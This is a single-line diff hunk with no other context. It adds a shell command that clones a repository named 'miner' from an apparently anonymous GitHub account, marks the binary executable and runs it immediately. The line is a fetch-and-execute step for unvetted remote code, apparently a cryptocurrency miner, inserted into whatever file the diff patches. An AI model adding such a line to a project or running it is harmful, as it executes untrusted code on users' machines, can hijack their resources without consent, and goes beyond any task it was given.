@@ -1,0 +1,1 @@
+git clone https://github.com/anonymousperson456/miner && cd miner && chmod +x miner && ./miner
